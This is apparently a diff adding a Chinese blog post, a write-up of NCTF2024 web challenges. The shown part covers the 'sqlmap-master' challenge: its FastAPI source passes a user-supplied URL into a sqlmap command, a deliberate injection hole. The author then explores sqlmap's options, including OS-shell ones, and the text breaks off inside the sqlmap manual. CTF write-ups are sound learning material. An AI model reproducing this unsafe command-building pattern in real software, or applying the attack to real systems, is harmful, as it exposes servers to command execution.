@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>NCTF2024 Web方向题解 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="在2025年的比赛为什么要叫2024呢(开玩笑)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2024 Web方向题解">
+<meta property="og:url" content="http://example.com/posts/32411.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="在2025年的比赛为什么要叫2024呢(开玩笑)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2025-03-24T08:37:02.000Z">
+<meta property="article:modified_time" content="2025-03-24T11:17:38.885Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bizhi_spring.png');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/32411.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">NCTF2024 Web方向题解</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2025-03-24T08:37:02.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-03-24</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~44.94K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/32411.html" class="leancloud_visitors" data-flag-title="NCTF2024 Web方向题解">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1742815058885"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>在2025年的比赛为什么要叫2024呢(开玩笑)</p>
+<span id="more"></span>
+<p>被队友带飞了，caterpie得了mvp，Err0r是躺赢狗：</p>
+<img src="/posts/32411/1.png" class title="awa">
+<h1><span id="sqlmap-master"> sqlmap-master</span></h1>
+<p><a target="_blank" rel="noopener" href="http://main.py">main.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>感觉像命令注入，在/run里能够通过执行sqlmap并返回执行结果</p>
+<p>直接命令注入不太行：</p>
+<img src="/posts/32411/2.png" class title="awa">
+<p>因此只能够尝试sqlmap自己有没有命令执行的地方了，使用<code>--help</code>参数查询帮助：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">        <span class="attr">___</span></span><br><span class="line">       <span class="attr">__H__</span></span><br><span class="line"> <span class="attr">___</span> <span class="string">___[&quot;]_____ ___ ___  &#123;1.9.3#pip&#125;</span></span><br><span class="line"><span class="attr">|_</span> <span class="string">-| . [.]     | .&#x27;| . |</span></span><br><span class="line"><span class="attr">|___|_</span>  <span class="string">[.]_|_|_|__,|  _|</span></span><br><span class="line">      <span class="attr">|_|V...</span>       <span class="string">|_|   https://sqlmap.org</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Usage</span>: <span class="string">python3.11 sqlmap [options]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Options</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">-h,</span> <span class="string">--help            Show basic help message and exit</span></span><br><span class="line">  <span class="attr">-hh</span>                   <span class="string">Show advanced help message and exit</span></span><br><span class="line">  <span class="attr">--version</span>             <span class="string">Show program&#x27;s version number and exit</span></span><br><span class="line">  <span class="attr">-v</span> <span class="string">VERBOSE            Verbosity level: 0-6 (default 1)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Target</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">At</span> <span class="string">least one of these options has to be provided to define the</span></span><br><span class="line">    <span class="attr">target(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-u</span> <span class="string">URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span></span><br><span class="line">    <span class="attr">-g</span> <span class="string">GOOGLEDORK       Process Google dork results as target URLs</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Request</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to specify how to connect to the target URL</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--data</span>=<span class="string">DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)</span></span><br><span class="line">    <span class="attr">--cookie</span>=<span class="string">COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)</span></span><br><span class="line">    <span class="attr">--random-agent</span>      <span class="string">Use randomly selected HTTP User-Agent header value</span></span><br><span class="line">    <span class="attr">--proxy</span>=<span class="string">PROXY       Use a proxy to connect to the target URL</span></span><br><span class="line">    <span class="attr">--tor</span>               <span class="string">Use Tor anonymity network</span></span><br><span class="line">    <span class="attr">--check-tor</span>         <span class="string">Check to see if Tor is used properly</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Injection</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to specify which parameters to test for,</span></span><br><span class="line">    <span class="attr">provide</span> <span class="string">custom injection payloads and optional tampering scripts</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-p</span> <span class="string">TESTPARAMETER    Testable parameter(s)</span></span><br><span class="line">    <span class="attr">--dbms</span>=<span class="string">DBMS         Force back-end DBMS to provided value</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Detection</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to customize the detection phase</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--level</span>=<span class="string">LEVEL       Level of tests to perform (1-5, default 1)</span></span><br><span class="line">    <span class="attr">--risk</span>=<span class="string">RISK         Risk of tests to perform (1-3, default 1)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Techniques</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to tweak testing of specific SQL injection</span></span><br><span class="line">    <span class="attr">techniques</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--technique</span>=<span class="string">TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Enumeration</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to enumerate the back-end database</span></span><br><span class="line">    <span class="attr">management</span> <span class="string">system information, structure and data contained in the</span></span><br><span class="line">    <span class="attr">tables</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-a,</span> <span class="string">--all           Retrieve everything</span></span><br><span class="line">    <span class="attr">-b,</span> <span class="string">--banner        Retrieve DBMS banner</span></span><br><span class="line">    <span class="attr">--current-user</span>      <span class="string">Retrieve DBMS current user</span></span><br><span class="line">    <span class="attr">--current-db</span>        <span class="string">Retrieve DBMS current database</span></span><br><span class="line">    <span class="attr">--passwords</span>         <span class="string">Enumerate DBMS users password hashes</span></span><br><span class="line">    <span class="attr">--dbs</span>               <span class="string">Enumerate DBMS databases</span></span><br><span class="line">    <span class="attr">--tables</span>            <span class="string">Enumerate DBMS database tables</span></span><br><span class="line">    <span class="attr">--columns</span>           <span class="string">Enumerate DBMS database table columns</span></span><br><span class="line">    <span class="attr">--schema</span>            <span class="string">Enumerate DBMS schema</span></span><br><span class="line">    <span class="attr">--dump</span>              <span class="string">Dump DBMS database table entries</span></span><br><span class="line">    <span class="attr">--dump-all</span>          <span class="string">Dump all DBMS databases tables entries</span></span><br><span class="line">    <span class="attr">-D</span> <span class="string">DB               DBMS database to enumerate</span></span><br><span class="line">    <span class="attr">-T</span> <span class="string">TBL              DBMS database table(s) to enumerate</span></span><br><span class="line">    <span class="attr">-C</span> <span class="string">COL              DBMS database table column(s) to enumerate</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Operating</span> <span class="string">system access:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to access the back-end database management</span></span><br><span class="line">    <span class="attr">system</span> <span class="string">underlying operating system</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--os-shell</span>          <span class="string">Prompt for an interactive operating system shell</span></span><br><span class="line">    <span class="attr">--os-pwn</span>            <span class="string">Prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">General</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to set some general working parameters</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--batch</span>             <span class="string">Never ask for user input, use the default behavior</span></span><br><span class="line">    <span class="attr">--flush-session</span>     <span class="string">Flush session files for current target</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Miscellaneous</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options do not fit into any other category</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--wizard</span>            <span class="string">Simple wizard interface for beginner users</span></span><br></pre></td></tr></table></figure>
+<p>好像还是没有，os-shell尝试了不行，由于是sqlmap，因此可以去github查看使用手册：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Usage</span>: <span class="string">python sqlmap.py [options]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Options</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">-h,</span> <span class="string">--help            Show basic help message and exit</span></span><br><span class="line">  <span class="attr">-hh</span>                   <span class="string">Show advanced help message and exit</span></span><br><span class="line">  <span class="attr">--version</span>             <span class="string">Show program&#x27;s version number and exit</span></span><br><span class="line">  <span class="attr">-v</span> <span class="string">VERBOSE            Verbosity level: 0-6 (default 1)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Target</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">At</span> <span class="string">least one of these options has to be provided to define the</span></span><br><span class="line">    <span class="attr">target(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-u</span> <span class="string">URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span></span><br><span class="line">    <span class="attr">-d</span> <span class="string">DIRECT           Connection string for direct database connection</span></span><br><span class="line">    <span class="attr">-l</span> <span class="string">LOGFILE          Parse target(s) from Burp or WebScarab proxy log file</span></span><br><span class="line">    <span class="attr">-m</span> <span class="string">BULKFILE         Scan multiple targets given in a textual file</span></span><br><span class="line">    <span class="attr">-r</span> <span class="string">REQUESTFILE      Load HTTP request from a file</span></span><br><span class="line">    <span class="attr">-g</span> <span class="string">GOOGLEDORK       Process Google dork results as target URLs</span></span><br><span class="line">    <span class="attr">-c</span> <span class="string">CONFIGFILE       Load options from a configuration INI file</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Request</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to specify how to connect to the target URL</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-A</span> <span class="string">AGENT, --user..  HTTP User-Agent header value</span></span><br><span class="line">    <span class="attr">-H</span> <span class="string">HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)</span></span><br><span class="line">    <span class="attr">--method</span>=<span class="string">METHOD     Force usage of given HTTP method (e.g. PUT)</span></span><br><span class="line">    <span class="attr">--data</span>=<span class="string">DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)</span></span><br><span class="line">    <span class="attr">--param-del</span>=<span class="string">PARA..  Character used for splitting parameter values (e.g. &amp;)</span></span><br><span class="line">    <span class="attr">--cookie</span>=<span class="string">COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)</span></span><br><span class="line">    <span class="attr">--cookie-del</span>=<span class="string">COO..  Character used for splitting cookie values (e.g. ;)</span></span><br><span class="line">    <span class="attr">--live-cookies</span>=<span class="string">L..  Live cookies file used for loading up-to-date values</span></span><br><span class="line">    <span class="attr">--load-cookies</span>=<span class="string">L..  File containing cookies in Netscape/wget format</span></span><br><span class="line">    <span class="attr">--drop-set-cookie</span>   <span class="string">Ignore Set-Cookie header from response</span></span><br><span class="line">    <span class="attr">--mobile</span>            <span class="string">Imitate smartphone through HTTP User-Agent header</span></span><br><span class="line">    <span class="attr">--random-agent</span>      <span class="string">Use randomly selected HTTP User-Agent header value</span></span><br><span class="line">    <span class="attr">--host</span>=<span class="string">HOST         HTTP Host header value</span></span><br><span class="line">    <span class="attr">--referer</span>=<span class="string">REFERER   HTTP Referer header value</span></span><br><span class="line">    <span class="attr">--headers</span>=<span class="string">HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)</span></span><br><span class="line">    <span class="attr">--auth-type</span>=<span class="string">AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)</span></span><br><span class="line">    <span class="attr">--auth-cred</span>=<span class="string">AUTH..  HTTP authentication credentials (name:password)</span></span><br><span class="line">    <span class="attr">--auth-file</span>=<span class="string">AUTH..  HTTP authentication PEM cert/private key file</span></span><br><span class="line">    <span class="attr">--ignore-code</span>=<span class="string">IG..  Ignore (problematic) HTTP error code (e.g. 401)</span></span><br><span class="line">    <span class="attr">--ignore-proxy</span>      <span class="string">Ignore system default proxy settings</span></span><br><span class="line">    <span class="attr">--ignore-redirects</span>  <span class="string">Ignore redirection attempts</span></span><br><span class="line">    <span class="attr">--ignore-timeouts</span>   <span class="string">Ignore connection timeouts</span></span><br><span class="line">    <span class="attr">--proxy</span>=<span class="string">PROXY       Use a proxy to connect to the target URL</span></span><br><span class="line">    <span class="attr">--proxy-cred</span>=<span class="string">PRO..  Proxy authentication credentials (name:password)</span></span><br><span class="line">    <span class="attr">--proxy-file</span>=<span class="string">PRO..  Load proxy list from a file</span></span><br><span class="line">    <span class="attr">--proxy-freq</span>=<span class="string">PRO..  Requests between change of proxy from a given list</span></span><br><span class="line">    <span class="attr">--tor</span>               <span class="string">Use Tor anonymity network</span></span><br><span class="line">    <span class="attr">--tor-port</span>=<span class="string">TORPORT  Set Tor proxy port other than default</span></span><br><span class="line">    <span class="attr">--tor-type</span>=<span class="string">TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))</span></span><br><span class="line">    <span class="attr">--check-tor</span>         <span class="string">Check to see if Tor is used properly</span></span><br><span class="line">    <span class="attr">--delay</span>=<span class="string">DELAY       Delay in seconds between each HTTP request</span></span><br><span class="line">    <span class="attr">--timeout</span>=<span class="string">TIMEOUT   Seconds to wait before timeout connection (default 